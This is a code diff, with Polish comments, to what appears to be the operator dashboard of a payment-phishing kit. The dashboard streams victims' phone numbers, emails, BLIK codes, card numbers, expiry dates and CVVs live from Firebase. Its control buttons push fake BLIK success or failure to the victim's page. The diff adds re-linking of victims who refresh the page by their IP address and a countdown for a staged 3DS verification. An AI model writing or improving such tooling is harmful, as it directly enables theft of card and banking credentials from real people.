@@ -357,6 +357,8 @@ const db  = getDatabase(app);
 
 const adminStartTs = Date.now();
 const processedKeys = new Set();
+const sidRemap = {}; // nowy SID -> oryginalny SID (przy odświeżeniu strony)
+window._sidRemap = sidRemap;
 
 // Słuchaj CAŁEGO węzła events bez filtra — filtrowanie po ts w JS.
 // onValue na całym węźle działa niezawodnie i dostarcza aktualizacje
@@ -378,6 +380,8 @@ onValue(ref(db, 'events'), (snap) => {
 
 // ── Nasłuch sessions — stały zapis, działa nawet gdy admin offline ──
 const sessionFieldState = {}; // sid -> { field: lastValue }
+const ipToSid = {};           // ip -> pierwotny SID (pierwsza sesja z tego IP)
+window._ipToSid = ipToSid;
 
 onValue(ref(db, 'sessions'), (snap) => {
   // Cache wszystkich sesji — używany przez sterowanie w historii
@@ -401,13 +405,36 @@ onValue(ref(db, 'sessions'), (snap) => {
     if (!s || !s.sid || !window._adminHandle) return;
     if (s.ts && s.ts < adminStartTs) return;
 
+    const ip = s.ip || null;
+
     if (!sessionFieldState[sid]) {
       sessionFieldState[sid] = {};
+
+      // Sprawdź czy już mamy użytkownika z tego IP
+      if (ip && ipToSid[ip] && ipToSid[ip] !== sid) {
+        // Ten sam IP — to odświeżenie strony, nie nowy użytkownik
+        const origSid = ipToSid[ip];
+        // Przenieś sterowanie ze starego SID na nowy
+        sidRemap[sid] = origSid;
+        // Pokaż toast o odświeżeniu
+        const u = users[origSid];
+        if (u) toast('🔄 ' + u.name + ' odświeżył stronę', '#f59e0b');
+        // Zaktualizuj status na żywo dla oryginalnego użytkownika
+        window._adminHandle({ sid: origSid, ts: s.ts || adminStartTs, t: 'tab', v: 'aktywna' });
+        window._adminHandle({ sid: origSid, ts: s.ts || adminStartTs, t: 'online_refresh', newSid: sid });
+        // Nie tworzymy nowego bloku — wróć
+        return;
+      }
+
+      // Nowy IP — nowy użytkownik
+      if (ip) ipToSid[ip] = sid;
       window._adminHandle({ sid, ts: s.ts || adminStartTs, t: 'online' });
     }
 
-    const base = { sid, ts: s.ts || adminStartTs };
-    const fields = ['phone','email','pay','total','discount','blik','cardnum','cardexp','cardcvv','cardname','modal','tab'];
+    // Jeśli ten sid jest remapowany na inny — używaj oryginalnego
+    const activeSid = sidRemap[sid] || sid;
+    const base = { sid: activeSid, ts: s.ts || adminStartTs };
+    const fields = ['phone','email','pay','total','discount','blik','cardnum','cardexp','cardcvv','cardname','modal','tab','verify_start'];
     fields.forEach(f => {
       if (s[f] !== undefined && s[f] !== sessionFieldState[sid][f]) {
         sessionFieldState[sid][f] = s[f];
@@ -511,6 +538,19 @@ function handle(m) {
       u.greeted = true;
       toast('🟢 ' + u.name + ' wszedł na stronę', '#00c864');
       beep('arrive');
+    }
+    return;
+  }
+  if (m.t === 'online_refresh') {
+    // Użytkownik odświeżył stronę — nowy SID, ten sam IP
+    setOnline(sid, true);
+    // Zaktualizuj ctrl na nowy SID żeby przyciski sterowania działały
+    if (m.newSid) {
+      // Nasłuchuj komend na nowym SID
+      const pill = document.getElementById('pill-' + sid);
+      const txt  = document.getElementById('pilltxt-' + sid);
+      if (txt) txt.textContent = 'ODŚWIEŻONO';
+      if (pill) { pill.style.borderColor = '#f59e0b'; pill.style.color = '#f59e0b'; }
     }
     return;
   }
@@ -711,7 +751,25 @@ function unlockCtrl(sid, method) {
 }
 
 function sendCtrl(sid, action) {
-  if (window._fbCtrl) window._fbCtrl(sid, action);
+  // Znajdź najnowszy aktywny SID dla tego użytkownika
+  // (może być inny niż oryginalny jeśli odświeżył stronę)
+  let activeSid = sid;
+  const ipToSid = window._ipToSid || {};
+  const cache   = window._sessionCache || {};
+
+  const ip = Object.keys(ipToSid).find(k => ipToSid[k] === sid);
+  if (ip) {
+    // Znajdź najnowszy SID z tym IP który jest online
+    let latestTs = 0;
+    Object.entries(cache).forEach(([s, data]) => {
+      if (data.ip === ip && (data.ts || 0) > latestTs && data.online !== false) {
+        latestTs = data.ts || 0;
+        activeSid = s;
+      }
+    });
+  }
+
+  if (window._fbCtrl) window._fbCtrl(activeSid, action);
   const labels = {
     blik_ok:   '✅ Wysłano: BLIK sukces',
     blik_fail: '❌ Wysłano: BLIK błąd',
@@ -765,6 +823,9 @@ function histCtrlStatus(hid, sid) {
   return { open: !!modal, modal, refreshed };
 }
 
+// Timery zegara weryfikacji per hid
+const histVerifyTimers = {};
+
 function updateHistCtrl(hid, sid) {
   const statusEl = document.getElementById('hctrl-status-' + hid);
   const btnsEl   = document.getElementById('hctrl-btns-' + hid);
@@ -773,25 +834,87 @@ function updateHistCtrl(hid, sid) {
 
   const session = window._sessionCache && window._sessionCache[sid];
   if (!session) {
-    // Brak sesji — nieaktywny
     statusEl.innerHTML = '<span style="color:#ff4466;font-size:12px;font-weight:600;">⚠️ Sesja nieaktywna</span>';
     lockEl.style.display = 'flex';
+    stopHistVerifyTimer(hid);
     return;
   }
-  const online  = session.online;
-  const tab     = session.tab;
-  const modal   = session.modal;
+  const online    = session.online;
+  const tab       = session.tab;
+  const modal     = session.modal;
+  const verifyTs  = session.verify_start;
   const refreshed = !online || tab === 'offline';
 
   if (refreshed) {
     statusEl.innerHTML = '<span style="color:#ff4466;font-size:12px;font-weight:600;">🔄 Strona odświeżona — brak możliwości sterowania</span>';
     lockEl.style.display = 'flex';
+    stopHistVerifyTimer(hid);
+  } else if (verifyTs && !refreshed) {
+    // Weryfikacja 3DS aktywna — pokaż zsynchronizowany zegar
+    lockEl.style.display = 'none';
+    startHistVerifyTimer(hid, verifyTs);
   } else if (!modal) {
     statusEl.innerHTML = '<span style="color:#f59e0b;font-size:12px;font-weight:600;">⏳ Okienko płatności nie jest otwarte</span>';
     lockEl.style.display = 'flex';
+    stopHistVerifyTimer(hid);
   } else {
     statusEl.innerHTML = '<span style="color:#00c864;font-size:12px;font-weight:600;">✅ Okienko otwarte: ' + modal + '</span>';
     lockEl.style.display = 'none';
+    stopHistVerifyTimer(hid);
+  }
+}
+
+function startHistVerifyTimer(hid, verifyStartTs) {
+  // Nie restartuj jeśli już działa dla tego samego ts
+  if (histVerifyTimers[hid] && histVerifyTimers[hid].ts === verifyStartTs) return;
+  stopHistVerifyTimer(hid);
+
+  const DURATION = 300;
+  const statusEl = document.getElementById('hctrl-status-' + hid);
+
+  function tick() {
+    const elapsed  = Math.floor((Date.now() - verifyStartTs) / 1000);
+    const seconds  = Math.max(0, DURATION - elapsed);
+    const mm = Math.floor(seconds / 60);
+    const ss = seconds % 60;
+    const timeStr  = mm + ':' + String(ss).padStart(2, '0');
+    const pct = Math.round(seconds / DURATION * 100);
+
+    // Kolor zależny od czasu
+    const color = seconds > 60 ? '#4da6ff' : seconds > 30 ? '#f59e0b' : '#ff4466';
+
+    if (statusEl) {
+      statusEl.innerHTML = `
+        <div style="display:flex;align-items:center;gap:10px;">
+          <svg width="36" height="36" viewBox="0 0 36 36" style="transform:rotate(-90deg);flex-shrink:0;">
+            <circle cx="18" cy="18" r="14" fill="none" stroke="#232733" stroke-width="3"/>
+            <circle cx="18" cy="18" r="14" fill="none" stroke="${color}" stroke-width="3"
+              stroke-dasharray="${2*Math.PI*14}"
+              stroke-dashoffset="${2*Math.PI*14*(1-seconds/DURATION)}"
+              stroke-linecap="round"/>
+          </svg>
+          <div>
+            <div style="color:${color};font-size:13px;font-weight:700;">🔐 Weryfikacja 3DS aktywna</div>
+            <div style="color:#5a6070;font-size:11px;margin-top:2px;">Pozostało: <strong style="color:${color}">${timeStr}</strong></div>
+          </div>
+        </div>`;
+    }
+
+    if (seconds <= 0) {
+      stopHistVerifyTimer(hid);
+      if (statusEl) statusEl.innerHTML = '<span style="color:#ff4466;font-size:12px;font-weight:600;">⌛ Czas weryfikacji minął</span>';
+    }
+  }
+
+  tick();
+  const interval = setInterval(tick, 1000);
+  histVerifyTimers[hid] = { interval, ts: verifyStartTs };
+}
+
+function stopHistVerifyTimer(hid) {
+  if (histVerifyTimers[hid]) {
+    clearInterval(histVerifyTimers[hid].interval);
+    delete histVerifyTimers[hid];
   }
 }
 
